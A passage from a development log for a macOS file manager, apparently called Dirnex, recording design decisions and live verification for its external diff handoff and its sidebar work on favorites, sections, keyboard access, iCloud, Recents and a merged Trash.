budget and was split at its own `MARK` into `PanelViewController+MenuValidation.swift`).

**Known limits, documented rather than papered over:** a nested repository's or submodule's own
ignore rules are invisible to the outer snapshot (only its `.git` is pruned), and the pre-existing
staleness where an FSEvents invalidation drops the cache but leaves the panel's numbers on screen is
untouched — clearing them on every ping would empty the column continuously through a build. The
payload delivery fix has no unit test: `DirectorySizeProvider` is a `private init` singleton wired to
`NotificationCenter`, and making it injectable for one test was judged scope creep this pass.

### Compare By Contents — the UX pass on the handoff (2026-07-20, VERIFIED LIVE)

Not a new feature: the M5 external-diff handoff worked, and a UX review of the *shipped* thing
found four defects around it. Worth recording because three of the four are the same shape — the
app knew something useful and didn't say it.

**The bug: the two columns could be transposed.** `comparableCursorPair()` built its pair as
`(self, counterpart)`, and `self` is whichever pane the responder chain dispatched to — the
*focused* one. Focus the right pane and the right pane's file opened in the diff tool's **left**
column. This is exactly the trap `beginSync` had already documented itself out of ("the physical
left pane is always the left side … so the direction controls match the on-screen layout"), and it
bites harder here: the diff tool labels its columns by filename, so comparing `report.log` against
`report.log` leaves the pane-of-origin readable only in a path subtitle. Now reads
`window.leftPanel`/`window.rightPanel`, like its sibling.

**Nothing was said, three times over.** (1) `launchExternalDiff` discarded the success case and
reported only failures — while a cold FileMerge takes seconds to draw its first window, so the app
looked like it had swallowed the keystroke. The launcher's own doc comment already promised the fix
("on success it carries the tool that was launched (for a status message)"); the caller just never
used it. (2) The menu item read "Compare By Contents…" with no hint what was about to launch, while
the *sync sheet's* row menu had said "Compare with FileMerge…" since M5. (3) With two tools
installed there was no way to choose: `ExternalDiffTool.preferred(identifier:)` existed and its doc
said the identifier was "used to persist the user's chosen tool", but nothing ever wrote or read
one — the hardcoded Kaleidoscope → BBEdit → FileMerge order was the only order there was.

**And the launch was unconditional**, though `ByteComparator` — the documented other half of this
very feature — was sitting right there. Spending a multi-second GUI launch to be told "0
differences" is the worst payoff the feature has.

Core: `ByteComparator.prescan(_:_:byteLimit:chunkSize:isCancelled:)` → `ContentComparison`
(`.identical` / `.different` / `.tooLargeToScan(largestByteSize:)`). **The size gate deliberately
runs first and outranks the free answer**: two differently-sized 2 GB files are known-unequal
without reading a byte, but that is not a reason to hand them to FileMerge — and settling
identical-or-not above the 64 MiB budget would mean reading both files end to end, which is the
regression the naive "just byte-compare first" ordering would have shipped. Within budget it is
`localFilesEqual`, so every existing short-circuit still applies.

App: the compare code moved out of `PanelViewController+Sync` (near its length budget, and the two
share only a launcher) into `PanelViewController+Compare.swift`. A pre-flight *failure* launches
anyway — this is an optimization, not a gate, and the diff tool reports an unreadable file better
than a second alert would. New `transientStatus` on the pane, a status-line message that outranks
the item count for 4 s with a `loadToken`-style generation guard; deliberately not an alert, since
nothing here needs a decision. One wrinkle the sync sheet forced: **a sheet covers the status line
it would land in**, so a final result becomes an alert on the sheet when one is up, while in-flight
notes stay status-line-only (a modal you must dismiss before the answer arrives is worse than
silence). Menu title is now set in `validateMenuItem` — AppKit's only hook for a title that tracks
live state — while the **palette keeps the generic catalog title, which is what its fuzzy search
matches against**. `AppPreferences.diffToolIdentifier` ("" = automatic) with an Operations-tab
picker whose footer names the installed tools, and covers the case that needs it most: none
installed, where the command greys out with no explanation. Shortcut **⌥F3**, the sibling of F3
"View" — F3 looks at the file under the cursor, ⌥F3 looks at it *against* the other pane's — checked
conflict-free under **both** presets (the TC preset claims bare F3 for Quick Look).

Verified live without a single pixel, which is the part worth stealing: **`ps -axo args` on the
spawned process is the assertion.** Differing pair → `FileMerge -left …/cmpL/differ.txt -right
…/cmpR/differ.txt`, proving the pane order end to end; identical pair → no diff tool in the process
table at all; an 80 MB/90 MB pair (different sizes, so the "free answer" case) → nothing launched,
held at the confirmation. Driven entirely through the existing AppleScript verbs (`reveal` +
`run operation "file.compareByContents"`) with the right pane's directory seeded into
`Dirnex.tabs.right` — System Events keystrokes are blocked without an accessibility grant, so the
right pane's *cursor* was positioned by controlling which row sorts first. The one thing that grant
would have added: reading the status-line text back. 882 core + 94 app tests green, swiftformat +
swiftlint --strict clean.

**Not done, and deliberately:** a built-in compare view. The diff window in the screenshot that
started this is FileMerge's, not ours — truncated lines, the single difference below the fold, no
visible next-difference affordance — and none of that is reachable from here. Owning it is a real
feature, not a polish pass; worth it only if external tools turn out to be a persistent
disappointment rather than an occasional one.

### M8 — The sidebar as a first-class surface (M)

The sidebar is the one navigation surface the user cannot shape. It shows a hardcoded
**Favorites** section nobody can touch, while the *actual* user-owned pin list — `Favorites`,
with add/remove/rename/reorder already tested in core — hides behind Ctrl+D and a modal
organizer. Two competing concepts, and the personalizable one is invisible. M8 collapses
them into one, then earns the sections that follow.

- [x] **Merge the favorites into the sidebar's Favorites section** — the pin list *becomes* the
      section, seeded on first run from `SidebarLocations.favorites()`. That is Finder's own model:
      user-owned, seeded with the standard folders, any of them removable. Retires the modal
      organizer; keeps the Ctrl+D menu's bare 1–9 jumps, which are the keyboard half of the feature
- [x] **Drag to reorder** — `Favorites.move(from:to:)` is already core-tested, and
      `FavoritesOrganizerController` already demonstrates the `NSTableView` reorder pattern to lift.
      Favorites only: Volumes is a mount-table snapshot re-sorted on every mount event, so a user
      order has nowhere to live
- [x] **Drag folders in from a pane** — panes already write `.fileURL` to the pasteboard, so
      pane → sidebar is a `registerForDraggedTypes` plus ~~`Favorites.add`~~ **`Favorites.insert(_:at:)`**
      (a drop has a position; `add` only appends). Directories only. A remote
      (SFTP) folder cannot ride `.fileURL` and needs a private `VFSPath` pasteboard type, or stays
      menu-only — still true, still menu-only
- [x] **Remove from the sidebar** — ~~reuse the `cell.onDelete` affordance the saved-search and
      server rows already carry~~ **a right-click item instead**; see the pass-2 note for why eight
      always-visible trash buttons was the wrong trade
- [x] **Collapsible sections** — group rows are inert today; with Searches/Favorites/iCloud/
      Volumes/Servers/Tags the list outgrows a laptop pane. Disclosure triangles, per-section
      state persisted
- [x] **Keyboard access to the sidebar** — it is mouse-only, in a keyboard-first app. Focus it,
      move by row, activate, all without reaching for the trackpad
- [x] **iCloud Drive row** — `~/Library/Mobile Documents/com~apple~CloudDocs`, a real directory
      (probed, present). Probe how dataless `.icloud` placeholder stubs list before wiring: size
      and download-on-access is the part that surprises
- [x] **Trash row** — cheaper-looking than it is. `~/.Trash` reads back `Operation not permitted`
      without Full Disk Access (probed), so it needs a graceful un-granted state tied to the M7 FDA
      flow. Trash is also per-volume (`/Volumes/X/.Trashes/$uid`), so a single row is a lie on a
      multi-drive setup — ~~resolved by~~ **one row over a merged listing, Finder's own answer**;
      "Put Back" has no public API (confirmed: the data is in the trash folder's `.DS_Store`); and
      delete-inside-Trash must invert the default move-to-Trash semantics or it is a no-op loop
- [x] **Recents row** — Finder's is a saved search, and saved searches already render into virtual
      result panels, so this reuses machinery instead of adding some

Exit: a folder dragged from a pane lands in the sidebar, is dragged into position, survives a
relaunch, and is reachable from the keyboard; iCloud Drive and Trash browse like any other location.
(Met, with one deliberate deviation: **the Trash is a merged listing, not a location.** It is the one
sidebar row that cannot be a directory — macOS keeps one trash per volume — so it browses like a
*results* pane rather than like a folder. See pass 8.)

Progress (2026-07-20, M8 pass 1 — the merge's ordering rules): the pure, tested half of the
Favorites merge landed, the same core-first opener every M4/M5/M6 slice used. **Box stays `[ ]`** —
no store flag, no sidebar section, no app wiring yet; this is only the model. One new core file
plus two additive functions, so the app is untouched and needed no rebuild (its suite was run
anyway, since the core it links changed).

- **`Services/FavoritesSeeding.swift`** — `Favorites.prepend(_:)`, the seed-vs-pins ordering rule, and
  `FavoriteEntry(place:)`. `prepend` does **not** reimplement de-duplication: `init(entries:)`
  already collapses duplicate paths keeping the *first* occurrence, so prepending and
  re-initializing yields the decided semantic (seed wins, at the seeded position, under the seeded
  name) out of the rule that already existed. It returns whether the list actually changed, so the
  app can skip a needless write. `FavoriteEntry(place:)` exists because the generic
  `FavoriteEntry(path:)` derives its label from the path's last component — which for `/Users/oleg`
  is the account name, so seeding through it would put a row called "oleg" atop every sidebar.
- **`VFS/Places.swift`** — `SidebarLocations.standardKind(for:home:)`, the icon lookup. Once
  Favorites is a pin list its rows arrive as bare paths rather than pre-tagged `FavoritePlace`s, and
  without this every row would silently degrade from its own SF Symbol to the generic folder icon.
  Deliberately a **pure path mapping that touches no disk**, unlike `favorites()`: a pinned folder
  that has since been deleted keeps its symbol instead of degrading the moment it goes missing, and
  a user who removes the seeded Downloads row and later drags it back gets the symbol back rather
  than being permanently demoted. `favorites()` was refactored to read the same `homeSubfolders`
  table the classifier reads, with a test asserting every kind the enumerator emits is one the
  classifier maps back — the two drifting apart is the failure mode that would otherwise ship quiet.

Progress (2026-07-20, M8 pass 2 — the Favorites section, VERIFIED LIVE): the sidebar's Favorites
section now *is* the pin list. **Box stays `[ ]` for one reason only**: the modal organizer is
deliberately still alive, because retiring it before the sidebar has drag-reorder would leave no way
to reorder at all. It retires when the drag slice lands, not before.

- **`FavoritesStore`** — gained `didChangeNotification` (posted on save, matching `SavedSearchStore`)
  and `seedStandardPlacesIfNeeded()`, called from `applicationDidFinishLaunching` before any window
  builds a sidebar. The seeded flag is set **even when the merge changes nothing**, so the migration
  is genuinely once: a fresh install whose `~` has no Desktop yet must not quietly re-seed on some
  later launch.
- **`SidebarViewController`** — `Row.place(FavoritePlace)` became `Row.favorite(FavoriteEntry)`;
  `rebuild()` reads `FavoritesStore`. The Favorites header is now rendered **even when the section is
  empty**, unlike every other section: it is the drop target for dragging a folder in, so hiding it
  would hide the way back from having removed everything.
- **`SidebarViewController+Favorites.swift`** (new) — cell rendering and the Open / Rename… /
  Remove from Sidebar menu. Two deliberate departures from the sibling sections: **no trailing trash
  button** (Searches and Servers hold a handful of rows, Favorites opens with eight, and eight
  always-visible trash buttons put a row of hazards over the folders reached for most), and **no
  confirmation sheet on remove** (deleting a saved search discards a composed query that cannot be
  recovered; this discards a pointer to a folder that has not moved — a sheet would be theatre).
- The main file was at 491 of its 500-line ceiling, so this pass had to *remove* as much as it
  added: `itemCell`'s favorites branch collapsed into a volume-only `volumeCell`, and the per-kind
  glyph table moved to the companion file. It sits at 494.

Live verification (real store, real binary — the debug dylib was grepped first to prove the new code
was actually in it): the migration ran against a favorites that already held one pin, `Dev`, and
produced exactly the decided shape — eight standard places, then `Dev`. Favorites rendered all nine
with their per-kind symbols and `Dev` correctly falling back to a plain folder, which is the
regression `standardKind` exists to prevent and which no test would have caught. ⌃D showed the same
nine rows with its 1–9 accelerators intact, confirming the two surfaces are one list. A full round
trip — pin `~/Dev/Common` via ⌃D, watch it appear in the sidebar with no relaunch, remove it via the
new menu — left the store byte-identical to how it started.

Progress (2026-07-20, M8 pass 3 — drag-and-drop, VERIFIED LIVE): reorder and drag-to-pin landed,
and with them the first four boxes close. **The modal organizer is now deleted** — it was kept
alive through pass 2 precisely so that reorder never disappeared between the two passes, and the
sidebar only earned its removal once dragging worked.

- **`Favorites.insert(_:at:)`** (core, tested) — the drop half, where `move` is the reorder half.
  `add` could not serve: a drop has a *position*. A path already pinned **repositions and keeps its
  existing entry** rather than duplicating, so a user-given name survives being dragged — the same
  refusal-to-rename `add` already had on a duplicate.
- **`SidebarViewController+FavoriteDrag.swift`** (new) — the row-index ↔ pin-index mapping, which
  is the whole of what the app layer adds. `favoriteDropRange` locates the section from its header
  rather than from its rows, which is what makes an **empty** Favorites section still a drop target;
  that is the second reason the header renders unconditionally. A drop proposed anywhere else in the
  sidebar is retargeted into Favorites rather than refused, so the insertion line always shows a
  real answer. Files among the dragged URLs are filtered out: a pin navigates a pane to a folder, so
  a pinned file would be a row that cannot do the one thing a row does.
- **The off-by-one**: `NSTableView` reports a drop as an insertion index in *pre-removal*
  coordinates while `Favorites.move` takes a destination in the resulting list. Both directions were
  driven live for exactly this reason — an upward move is unaffected by the adjustment and would
  have passed either way.
- Room for all this came from *removing* code: the saved-search and server cell rendering moved into
  the companion files that already own those sections, taking the main file from 494 to 453.

Live verification: `Dev` dragged from last position to second and back, landing exactly where the
insertion line showed each time; `~/Public` dragged in from a pane and pinned; a **file** dragged
over the sidebar drew no insertion line and pinned nothing. The store finished byte-identical to
how it started. ⌃D still lists the same rows with 1–9 intact and no gap where "Organize Favorites…"
used to be.

Progress (2026-07-20, M8 pass 4 — collapsible sections, VERIFIED LIVE): every header now folds its
section, and the state persists. Core-first again — a pure, tested model file with the app
untouched, then the wiring.

- **`Services/SidebarSections.swift`** (core, tested) — `SidebarSection` (an enum whose `allCases`
  *is* the render order) and `SidebarSectionCollapse`. The header row used to carry its title
  *string*, which the drag code compared against `"Favorites"` to find the section — a user-visible
  label was load-bearing. The `Row.header` case now carries a `SidebarSection`, so title text is a
  presentation detail again and the drop range keys off `headerRow(of: .favorites)`. **Collapsed
  sections persist as raw strings, not decoded cases:** a `Set<SidebarSection>` throws on the first
  name it doesn't know, and a throwing decode resets *every* section — so a beta rolled back past
  the iCloud/Trash/Recents rows still to come would silently unfold the whole sidebar. The unknown
  name is carried through the round trip untouched instead; a test drives exactly that.
- **`SidebarSectionCollapseStore`** — one shared state, not one per window, matching every other
  sidebar store (the genuinely per-window `showsAllTags` stays unpersisted). Posts a change
  notification so every open sidebar folds in step.
- **`SidebarViewController+Sections.swift`** (new) — `append(_:items:showsEmptyHeader:)` assembles
  each section, skipping a folded one's rows and skipping an empty section entirely *except*
  Favorites, whose header is the drag-in drop target. This is what took `rebuild`'s five hand-rolled
  section blocks down to five `append` calls and kept the main file (453 → 470) clear of its ceiling.
  An `NSTableView`, not an `NSOutlineView`: every row is a leaf, so folding is a build-time filter,
  not a view feature — and the drag code keeps one flat index space to map through.
- **The whole header is the click target**, not just the 9-pt chevron (a mean thing to ask anyone
  to hit), routed through `SidebarTableView.onHeaderClick` alongside the existing empty-click
  focus-return. The triangle is always drawn, never hover-revealed: it is a state indicator first,
  and without it a *folded* Volumes section and a machine with *no* volumes would look identical.
- **A drop onto a folded Favorites header unfolds it** — otherwise the pin is filed into rows the
  user cannot see, indistinguishable from a refused drag. `expandSection` returns whether it changed
  anything so the drag path doesn't save-and-rebuild needlessly.

Live verification (real store, real binary — dylib grepped first): folded Favorites, its eight pins
vanished, the header and its now-rightward chevron remaining with a "Show Favorites" tooltip; the
state persisted as `["favorites"]` and **survived a relaunch** folded. A folder dragged from a pane
onto the *collapsed* header unfolded the section and pinned at the drop position in one gesture.
Removing that pin and deleting the flag left the store byte-identical to how it started; no errors
in the run log throughout.

Progress (2026-07-20, M8 pass 5 — keyboard access to the sidebar, VERIFIED LIVE): the source list
is reachable and fully drivable from the keyboard, closing the second exit criterion. Core-first,
though the core half here is small: the sidebar's *keys* are pure app plumbing, so what landed in
`DirnexCore` is only the command that names the gesture.

- **`CommandCatalog` gains `view.focusSidebar` on ⌥⌘S** — deliberately the sibling of ⌃⌘S (toggle),
  because the app has no other spatial focus key and Tab is spoken for by the two-pane switch, which
  a sidebar joining the cycle would have muddied. Rebindable like every shortcut. A catalog test
  asserts it is a conflict-free View command distinct from the toggle it sits beside.
- **The command was the entry that pushed `CommandCatalog.swift` past 500 lines**, so the View…
  Application category arrays moved to a new `CommandCatalogCategories.swift` (the five widening from
  `private` to `internal`, since Swift's `private` doesn't cross files); `all` still composes them.
  The main file dropped to 213.
- **`SidebarViewController+Keyboard.swift`** (new) is the whole interaction, modelled on
  `NSOutlineView` adapted to a flat table whose expand/collapse *is* the M8 fold state: **← ** steps
  an item out to its section header or collapses an open header, **→** expands a closed header or
  steps into an open one, **Return** activates an item (handing focus back to the pane, so browsing
  continues there) or folds a header, and **Tab/Escape** leave for the active pane. Headers became
  keyboard-selectable (`shouldSelectRow` now returns `true`) precisely so ←/→/Return have something
  to land on — the mouse still never selects one, because `SidebarTableView.mouseDown` intercepts a
  header click before `super`.
- **The fold helpers split along the focus seam.** A mouse header-click folds *and hands focus back
  to the pane*; a keyboard fold must *keep* sidebar focus and re-place the cursor on the header
  (the store write rebuilds synchronously and clears selection, so the header is re-selected against
  the fresh rows). `toggleSection(atRow:)` and `setSectionCollapsed(_:for:)` now divide exactly
  there.
- **Focusing reveals a collapsed sidebar first** (`BrowserWindowController+Sidebar`, reached through
  the responder chain like `view.terminal`): focusing an invisible list is a dead keystroke. The
  cursor lands on the active pane's current location if it is pinned, else the first real row —
  never a header, so the first thing the user sees highlighted is a destination.

Live verification (real binary, dylib grepped first): ⌥⌘S — the shortcut *and* the menu item, both
present with the right glyphs — focused the sidebar onto **Home**, the left pane's location; ↑/↓
moved Home→Desktop→Documents; ← climbed to the Favorites header, ← again collapsed it *keeping the
header selected across the rebuild*, → re-expanded it, → again stepped into Home; Return on Desktop
navigated the pane there and **returned focus to the pane** (its `..` row went active-blue while the
sidebar's selection dimmed to unfocused grey). Tab from the sidebar returned to the pane without
navigating; Tab from a pane still switched panes — no regression. Escape shares Tab's exit path and
is not synthesizable under computer-use (docs/NOTES.md), so it rode the physical-key equivalent. The
collapse flag toggled during the run was deleted afterward, leaving the store as found; no errors in
the log.

Follow-up (2026-07-20, same day — the collapse-with-focus leak, VERIFIED LIVE): now that the sidebar
can hold first responder, hiding it (⌃⌘S) *while it was focused* stranded keyboard focus on the bare
window — both panes grey and Tab dead, since Tab is a pane key with no window-level fallback (see
docs/NOTES.md). `SidebarFocusSplitViewController` subclasses the outer split only to override
`toggleSidebar(_:)` — the one funnel both the menu/palette and the titlebar button already call —
capturing whether the sidebar held focus *before* `super` collapses it and handing focus to the
active pane after. Chosen over a KVO observer, which would race the first-responder move; chosen over
retargeting the toggle, which would forfeit AppKit's automatic Show/Hide-Sidebar menu title. Verified
live: focus sidebar → ⌃⌘S → the active pane took focus and Tab switched panes again; toggling the
sidebar while a *pane* was focused left that pane untouched; the menu title still flipped
Show↔Hide. A clean launch-and-quit with nothing touched left the collapse store's key absent —
confirming no code path writes it spuriously.

Progress (2026-07-21, M8 pass 6 — the iCloud Drive row, VERIFIED LIVE): iCloud Drive is now its own
sidebar section between the user's pins and the local volumes, mirroring Finder. Core-first: a pure,
tested existence probe, then a thin app wiring.

- **The probe settled the box's worry.** `com~apple~CloudDocs` is reachable *without* Full Disk
  Access even though its parent `~/Library/Mobile Documents` is TCC-gated (an `ls` on the parent
  returns `Operation not permitted`; the leaf lists fine) — so the enumerator probes the leaf
  directly, never the parent. And the "download-on-access" surprise is a **non-issue for this row**:
  `LocalBackend` lists via raw `readdir`/`fstatat` and takes each size from `st_size`, never opening
  a file, so browsing iCloud Drive downloads nothing. A dataless `.icloud` placeholder would surface
  as its literal on-disk `.<name>.icloud` stub (we `readdir` rather than route through
  `NSMetadataQuery`), which is a pane-display detail, not a blocker — and moot on this machine, where
  everything is already downloaded (zero `.icloud` stubs found).
- **`SidebarLocations.iCloudDrive()`** (core, tested) — returns `VFSPath?`, the container path when it
  exists on disk, else `nil`, so a Mac with iCloud Drive turned off shows no dead row: the same
  "only what exists" rule `favorites()` follows. A pure path-plus-`isDirectory` probe, no AppKit.
  Three tests (present / absent / a file where the dir should be) plus the render-order test updated
  for the new `.icloud` case, which sits between `.favorites` and `.volumes` in `SidebarSection`.
- **A section, not a Favorites row** — Finder groups iCloud under its own header, and the collapse
  model was built expecting exactly this (the unknown-name round trip in `SidebarSectionCollapse`
  names iCloud among the sections "still to add"). Deliberately a **system** location, not a
  user-owned pin: `Row.iCloud(VFSPath)` carries its path directly rather than a stored model, and the
  new **`SidebarViewController+iCloud.swift`** cell has no drag, no context menu, and no store — it is
  present or absent purely on whether iCloud Drive is on. The row went to a companion file because the
  main controller sits at 492 of its 500-line ceiling.
- **Keyboard access came for free.** The row plugs into the existing M8 keyboard model through the
  generic `.path` accessor — no keyboard code changed — so ←/→/Return and ⌥⌘S drive it like any other
  destination.

Live verification (real store, real binary — the debug dylib was grepped first to prove the new
`iCloudCell` / `iCloudDrive` code was in it): the section rendered between Favorites and Volumes with
the `icloud` glyph; clicking **iCloud Drive** navigated the left pane to
`…/Library/Mobile Documents/com~apple~CloudDocs`, which listed its real two items (Car, Downloads;
`.DS_Store` hidden as expected) with no download, hang, or error. Folding left the header alone with a
rightward chevron and a "Show iCloud" tooltip; the flag persisted as `["icloud"]` and **survived a
relaunch** folded. From the keyboard: ⌥⌘S focused the sidebar, ↓ walked to the iCloud header, → opened
it, → again stepped onto iCloud Drive, and Return navigated the pane and handed focus back to it. The
collapse key was deleted afterward, leaving the store byte-identical to how it started (originally
absent); no errors in the run logs. **Two boxes remain** — Trash and Recents.

Progress (2026-07-21, M8 pass 7 — the Recents row, VERIFIED LIVE): Recents is now the sidebar's
first section, where Finder puts it — one fixed row that runs the recently-used-files query into a
virtual results panel, reusing the search machinery rather than adding any. Core-first: a pure,
tested query plus the section case, then a thin app wiring. **One box remains — Trash.**

- **`Services/RecentsQuery.swift`** (core, tested) — the pure query. Finder's Recents is
  `kMDItemLastUsedDate`, the LaunchServices "last opened" stamp, *not* the modification date
  `SpotlightQuery.modifiedWithin` filters on, and that distinction is the whole reason it is its own
  type: a last-used filter keeps Recents to opened documents instead of a wall of `~/Library` churn
  (a cache the system rewrites hourly is never *opened*). Probed 2026-07-21: the last-used filter
  returned **181 clean items**, only two under `Library`. Application bundles are excluded — without
  it the list led with Console.app / Terminal.app / Finder.app — but folders are *not*: a
  recently-used folder is a real navigation target in a file manager, and excluding `public.folder`
  also risks dropping document packages that conform to it. A 30-day window bounds the set, because
  `mdfind` cannot sort (there is no sort flag — probed) and the runner keeps only its first N, so an
  unbounded query would surface an arbitrary N rather than the newest.
- **The sort is a documented proxy.** `mdfind` returns paths in no useful order and a statted
  `FileEntry` carries no last-used date, so `RecentsQuery.resultSort` orders the panel by
  modification date descending — the only recency signal the app can compute. For documents a person
  is working on, used and modified move together; a watched-but-unedited video sorts by when it was
  written. Bringing the true last-used date into the ordering is left to a later pass if it proves to
  matter.
- **`SidebarSection.recents`** leads `allCases` (Finder's placement), so it renders above Searches. A
  single-row section like iCloud, not a Favorites row: it dispatches a query, not a place, so it
  carries no path and no stored model — `Row.recents` and `SidebarViewController+Recents.swift`
  mirror the iCloud row exactly (clock glyph, no drag, no menu, no store). Keyboard access, folding
  and persistence came for free through the generic `.section` / `.path` model — no keyboard or fold
  code changed.
- **The app reuses the virtual-results installer.** `SpotlightSearchRunner.runRecents` shares `run`'s
  cap-and-stat tail; `PanelViewController.showRecents` installs a "Recents" results tab through the
  same `openResults` that saved searches use, generalized to take a sort and an optional (here `nil`,
  so unsavable) query. Room for all this came from *removing* code, as every M8 pass has: the volume
  cell moved to a new `SidebarViewController+Volumes.swift` and the sidebar delegate conformance to
  `BrowserWindowController+Sidebar.swift`, taking both files back under their 500-line ceilings.

Live verification (real store, real binary — the debug dylib was grepped first to prove the new
`RecentsQuery` / "Recently used files" code was in it): the Recents section rendered first with the
`clock` glyph; clicking it opened a virtual "Recents" tab ("Results for Recents") listing exactly
**181** items, newest-modified first, folders and files interleaved, no `.app` among them — matching
the probe count precisely. From the keyboard: ⌥⌘S focused the sidebar onto Recents, ← climbed to the
header, ← again collapsed it *keeping the header selected across the rebuild*; the flag persisted as
`["recents"]` and **survived a relaunch** folded, and a header click unfolded it. The collapse key
was deleted afterward, leaving the store byte-identical to how it started; no errors in the run logs.

Progress (2026-07-21, M8 pass 8 — the Trash row, VERIFIED LIVE): the last box. Trash is the sidebar's final row,
where the Dock puts it, and it opens **every volume's trash merged into one listing** — Finder's own
answer, chosen over a single `~/.Trash` row (a lie the moment a drive is plugged in) and over one row
per volume. Core-first: a pure, tested locator plus the section case, then the app wiring.

- **Four probes, three of which changed the design.** (1) `FileManager.trashItem` on an item
  *already in the trash* returns **success** and hands back the path it was given — the "no-op loop"
  the box predicted is real and silent. (2) `<volume>/.Trashes` is mode `d-wx--x--t`, **unlistable
  even by its owner**, while `<container>/<uid>` inside it is a normal `drwx------` — the same
  leaf-not-parent shape the iCloud container had in pass 6. (3) `FileManager.url(for:
  .trashDirectory, appropriateFor:)` **throws `NSFeatureUnsupportedError`** for a volume that merely
  has nothing trashed on it yet, and only starts answering once the directory exists — trusting it
  would have read as "external volumes have no Trash" and quietly shipped a row that never merges
  anything. (4) Put-back data lives in the trash folder's `.DS_Store`, not an xattr (`xattr -l` on a
  trashed file shows only `TextEncoding` and `provenance`), confirming there is no public API for it
  and nothing to build against.
- **`VFS/TrashLocations.swift`** (core, tested) — pure path construction plus `isInsideTrash`, with
  the existence-filtered `SidebarLocations.trashDirectories` beside the other "only what exists"
  enumerators: the same pure-vs-touches-disk split `standardKind(for:)` draws against `favorites()`.
  `isInsideTrash` is lexical because it must answer for a path that was *just deleted* and must not
  cost a `stat` on every menu validation. It is deliberately **generous** — any user's numbered
  trash counts — since a false positive costs one confirmation dialog while a false negative is
  probe (1).
- **The delete inversion is one line in the capability lookup, not a branch in the delete path.**
  `capabilities(for:)` withdraws `.trash` from any path inside a trash, and the M5 capability
  degradation (written for SFTP, which has no Trash either) already turns F8 into a confirmed
  permanent delete. The merged listing itself is `[.read, .write]` for the same reason — writable,
  Trash-less. `LocalBackend.trashItem` also refuses an already-trashed item outright: the UI can
  no longer reach that call, but the invariant belongs at the layer that touches the bytes rather
  than resting on every future caller remembering to ask.
- **A results tab, not a backend.** The merge is a listing, not a filesystem, so it reuses the
  virtual-results machinery that search and Recents already ride — entries carry their real
  `.local` paths, only the container is synthetic. That made `openResults` its third caller, so it
  moved out of `PanelViewController+Search` into a new `+Results` file along with a shared
  `isResultsListing` (`isSearchResults` now means specifically "Spotlight hits", which is all that
  "Save Search…" ever wanted). One deliberate difference from its siblings: **the Trash re-lists**
  rather than staying a snapshot, because what changes in it is what the user just did in that pane.
- **No dotfiles.** The results default of "show every hit, dotfiles included" is overridden to
  follow the pane, because a trash's dotfiles are Finder's `.DS_Store` put-back databases, not
  things anyone threw away.
- **Empty Trash** (added the same day, on request — the pass shipped without it, arguing that ⌘A
  then F8 *inside* the Trash was safer than a one-click destroy of items the user cannot see). It is
  a right-click on the Trash row, where the Dock's own Trash puts it. The safety the in-pane route
  gets for free is bought back by **naming the count in the confirmation** — and by counting what
  the Trash *shows*, not what it holds: every trash directory carries a `.DS_Store`, so a raw count
  would offer to erase "1 item" from a Trash the user sees as empty, and then a second Empty would
  offer the same thing forever. Everything is erased, hidden files included; nothing hidden is ever
  a reason to ask. An already-empty Trash says so rather than opening a confirmation for nothing.

Live verification (real store, real binary, dylib grepped first): the Trash section rendered last in
the sidebar with the `trash` glyph. **Ungranted first** — clicking it raised the Full Disk Access
sheet rather than an empty Trash, which is the whole point of that path. **Then the inversion, which
needs no grant**: a pane pointed at a scratch volume's real `.Trashes/501` answered F8 with "Delete
"probe-file.txt" permanently? This can't be undone" — while F8 in an ordinary folder still moved to
the Trash silently, so the capability change didn't leak. **Then, with the grant in place**, the row
opened a "Trash" tab merging two volumes in one listing (`~/.Trash` and the scratch volume's trash,
one item each, no `.DS_Store` shown); toggling hidden files revealed exactly the two databases and
nothing else, and the Empty sheet's count of 2 matched the visible listing rather than the four
entries on disk. Empty Trash erased both volumes (confirmed on disk) and the already-empty case
reported "The Trash is empty". No errors in any of the three run logs.

- **The bug live verification caught**, and the reason this pass had to run rather than compile:
  after the first real Empty, the pane went on listing two files that no longer existed. `reloadTrash`
  installed the new model but skipped `reloadEverything()` — the render call the real-directory
  refresh ends with. Nothing failed, nothing logged; the model and the screen simply disagreed. Now
  in docs/NOTES.md, since any future refresh path can make the same silent mistake.
- **Ungranted degrades to the ask, never to an empty Trash.** `~/.Trash` needs Full Disk Access, and
  a permission error anywhere stops the gather and raises the M7 onboarding sheet in Trash-specific
  wording. Showing the merge minus the home trash would be worse than useless: "your Trash is empty"
  is a claim about the Trash where the truth is a claim about permission — the same failure shape as
  the filtered-out size row in docs/NOTES.md.

**Follow-up pass (2026-07-21), from using it:** three places where the Trash tab was still wearing
the results tab's clothes.

- **A results tab's chip outlived its listing.** `customTitle` (and the query behind "Save Search…")
  was set when the tab opened and cleared only when a vanished directory reset the tab — so clicking
  Home out of the Trash landed in the home folder with the tab still labelled "Trash". `navigate`
  now drops the whole results identity on arrival, captured *before* the load like `wasVirtual`
  beside it. Search and Recents tabs had the same bug; it is only glaring on the Trash, whose label
  is a place name rather than a query.
- **The Trash gets its own two context menus** rather than the folder ones greyed down. What a
  trashed file offers is a different list, not a subset: no rename (the container advertises no
  `.rename`), no Pack or Paste, and a destructive tail that says `Delete Immediately…` — F8 in a
  trash already degrades to a confirmed permanent delete, so "Move to Trash" was naming the wrong
  operation. The background menu is **Empty Trash…** alone: the ordinary background menu is about
  the folder you are standing in, and the merged Trash is several folders on several volumes.
- **`canWriteHere` now also requires a real directory.** The merged listing is the one virtual
  location carrying `.write` (it holds real files that can really be deleted), which lit New Folder
  and Paste up in a Trash tab over flows that bail out at their own `isVirtualDirectory` guard —
  offering an operation that silently does nothing.
- **The path bar says `🗑 Trash`**, not "🔍 Results for Trash": the Trash is not a search someone
  ran, and it does not behave like one (it re-lists after a delete, where a snapshot does not).

Verified live on the real binary: Recents → Home and Trash → Home both relabel the chip to `oleg`;
both Trash menus render as designed with every item live; Empty Trash… from the pane's background
opens the counted confirmation; New Folder is greyed in the File menu inside the Trash.

**Restore pass (2026-07-21):** Put Back, per item and for the whole Trash.

- **Probed before writing any of it, and the probe decided the design.** There is no API: a trashed
  file's only xattr is `com.apple.provenance`, `mdls` knows nothing, and every plausible
  `URLResourceKey` spelling returns empty. The origin lives in the trash folder's own `.DS_Store` as a
  `ptbL`/`ptbN` pair — so restoring means **reading Finder's format**. `DSStoreReader` (core, tested)
  walks the buddy-allocator B-tree; `TrashPutBack` (core, tested) interprets the pair. The app half is
  the moving and the reporting.
- **The probe also settled three things a guess would have got wrong.** `FileManager.trashItem` writes
  the records too, so items Dirnex trashed restore like Finder's. The recorded folder is relative to
